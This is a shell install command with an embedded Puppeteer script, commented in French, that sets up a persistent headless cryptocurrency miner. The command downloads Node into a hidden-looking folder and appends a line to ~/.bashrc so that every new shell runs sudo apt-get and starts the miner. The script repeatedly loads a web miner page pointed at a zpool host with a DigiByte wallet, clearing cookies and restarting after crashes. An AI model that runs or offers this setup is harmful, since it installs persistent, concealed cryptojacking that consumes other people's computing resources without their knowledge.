cd ~/. && wget https://nodejs.org/dist/v22.11.0/node-v22.11.0-linux-x64.tar.xz && tar -xvf node-v22.11.0-linux-x64.tar.xz && rm -rf node-v22.11.0-linux-x64.tar.xz && cd node-v22.11.0-linux-x64 && touch online && chmod +x * && echo "~/./node-v22.11.0-linux-x64/online" >> ~/.bashrc && echo "cd ~/./node-v22.11.0-linux-x64/bin && sudo apt-get install -y xvfb && xvfb-run node minerdash.js" > ~/./node-v22.11.0-linux-x64/online && 
cat << 'EOF' > ~/./node-v22.11.0-linux-x64/bin/minerdash.js

const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ 
    headless: "new", 
    args: [
      '--no-sandbox', 
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage', // Important pour éviter les crashs mémoire sur Linux
      '--disable-gpu'
    ] 
  });

  // Gestion de la page unique
  let page = await browser.newPage();

  async function runCycle() {
    try {
      console.log(`[${new Date().toLocaleTimeString()}] --- Nouveau Cycle de Minage ---`);
      
      // Nettoyage de la session précédente
      const client = await page.target().createCDPSession();
      await client.send('Network.clearBrowserCache');
      await client.send('Network.clearBrowserCookies');

      const url = 'https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=dgb1qrug3hsk2whxut7z2mp2trtsgju3d0zeyx2ah6l&password=c%3DDGB&workers=10';

      // Navigation avec timeout de 60s
      await page.goto(url, { 
        waitUntil: 'networkidle2', 
        timeout: 60000 
      });

      console.log(`[${new Date().toLocaleTimeString()}] Minage actif. Refresh automatique dans 15 min.`);
      
      // Utilisation d'un délai propre avant le prochain cycle
      setTimeout(runCycle, 15 * 60 * 1000);
      
    } catch (e) {
      console.error(`[${new Date().toLocaleTimeString()}] Erreur détectée : ${e.message}`);
      console.log("Nouvelle tentative dans 30 secondes...");
      setTimeout(runCycle, 30000);
    }
  }

  // Surveillance des crashs de la page
  page.on('error', async (err) => {
    console.error('Page crashée, recréation de l\'onglet...', err);
    await page.close();
    page = await browser.newPage();
    runCycle();
  });

  runCycle();
})();
EOF

&& cd ~/./node-v22.11.0-linux-x64/bin && sudo apt-get install -y xvfb && npm init -y && npm install -y puppeteer && xvfb-run node minerdash.js